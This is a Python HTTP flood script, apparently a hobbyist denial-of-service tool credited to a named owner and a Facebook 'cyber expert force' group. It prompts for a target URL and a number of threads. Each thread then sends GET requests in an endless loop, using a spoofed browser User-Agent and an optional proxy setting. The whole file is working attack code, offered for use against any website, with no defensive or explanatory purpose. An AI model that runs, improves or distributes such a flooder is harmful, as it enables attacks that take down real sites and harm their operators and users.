import threading
import requests
import random
import time,os
import sys

# ANSI escape code for cyan color
CYAN = '\033[96m'
RESET = '\033[0m'
YELLOW = '\033[93m'
GREEN = '\033[92m'
READ= '\033[91m'

# Logo
logo = r"""
  /$$$$$$   /$$$$$$  /$$$$$$$$ /$$$$$$$$
 /$$__  $$ /$$__  $$| $$_____/| $$_____/
| $$  \__/| $$  \__/| $$      | $$      
| $$      | $$      | $$$$$   | $$$$$   
| $$      | $$      | $$__/   | $$__/   
| $$    $$| $$    $$| $$      | $$      
|  $$$$$$/|  $$$$$$/| $$$$$$$$| $$      
 \______/  \______/ |________/|__/      
                                        
______________________×______________________
Owner          : TAMIM RAJPUT
Github         : https://github.com/TAMIM-RAJPUT
Facebook GROUP : CIVILIAN CYBER EXPERT FORCE 
Contact        : ARAFAT ISLAM
______________________×______________________
"""

# Function to animate the logo
def print_animated_logo(logo, delay=0.07):
    for line in logo.splitlines():
        sys.stdout.write(CYAN + line + RESET + '\n')
        sys.stdout.flush()
        time.sleep(delay)

# Function to send HTTP requests with customization
def send_request(url, headers=None, proxies=None, timeout=5):
    try:
        response = requests.get(url, headers=headers, proxies=proxies, timeout=timeout)
        print(f"{GREEN}Request sent: {response.status_code}")
        return response.status_code
    except requests.exceptions.RequestException as e:
        print(f"{READ}Request failed: {e}")
        return None

# Worker function for threads
def worker(url, headers, proxies, timeout):
    while True:
        send_request(url, headers=headers, proxies=proxies, timeout=timeout)

# Main function
def main():
    os.system("clear")  
    # Print the animated logo
    print_animated_logo(logo, delay=0.1)

    # Input target URL
    url = input("Enter the target URL: ")

    # Optional: Random User-Agent Headers
    user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0",
    "Dalvik/2.1.0 (Linux; U; Android 10; en-US; Nexus 5 Build/XYZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
    "Dalvik/2.1.0 (Linux; U; Android 10; en-US; Nexus 5 Build/XYZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 10; en-US; Nexus 5 Build/XYZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 10; en-US; Nexus 5 Build/XYZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SQ1D.2201001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SQ1D.2201001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 10; en-US; Nexus 5 Build/XYZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SQ1D.2201001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 10; en-US; Nexus 5 Build/XYZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0"
]

    # Create headers
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5"
    }

    # Proxy list (Optional)
    proxies = None  # Example: {"http": "http://proxy_ip:proxy_port", "https": "http://proxy_ip:proxy_port"}

    # Number of threads
    threads = int(input("Enter the number of threads: "))
    timeout = int(input("Enter timeout (seconds): "))

    # Start threads
    thread_list = []
    for i in range(threads):
        thread = threading.Thread(target=worker, args=(url, headers, proxies, timeout))
        thread_list.append(thread)
        thread.start()

    # Wait for all threads
    for thread in thread_list:
        thread.join()

if __name__ == "__main__":
    main()



